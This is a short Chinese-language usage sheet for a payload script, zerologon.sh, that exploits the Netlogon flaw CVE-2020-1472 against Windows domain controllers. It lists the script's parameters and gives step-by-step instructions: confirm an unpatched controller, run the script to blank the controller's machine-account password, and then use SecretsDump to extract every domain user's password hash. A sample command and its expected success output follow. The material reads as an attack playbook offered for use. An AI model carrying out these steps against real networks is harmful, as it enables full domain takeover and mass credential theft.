## 📦 载荷使用说明：zerologon.sh

### 📝 功能说明
针对 Netlogon 特权提升漏洞（CVE-2020-1472）的利用脚本。利用加密协议的缺陷，将域控制器的计算机账户密码置空，从而直接获取域控最高权限。

### ⚙️ 参数说明
```text
- `dc_name`：目标域控制器的 NetBIOS 名称
- `dc_ip`：目标域控制器的 IP 地址
```

### 🚀 操作步骤
1. 确认目标域控制器存在 ZeroLogon 漏洞（未打补丁）。
2. 修改脚本中的域控名称和 IP 地址。
3. 执行脚本：`bash zerologon.sh`。
4. 攻击成功后，域控的计算机账户密码将被重置为空（空 Hash：`31d6cfe0d16ae931b73c59d7e0c089c0`）。
5. 随后使用 SecretsDump 以空密码导出所有域用户 Hash，并务必在事后恢复域控密码。

### 💻 执行样例
```bash
# 对域控 DC01 执行 ZeroLogon 攻击
./zerologon.sh DC01 192.168.1.10

# 预期输出：
# [*] Performing authentication attempts...
# [*] ==================================================================
# [*] Target vulnerable, changing account password to empty string
# [*] Result: 0
# [*] Exploit complete!
# [*] The machine account password for DC01$ has been set to an empty string.
```
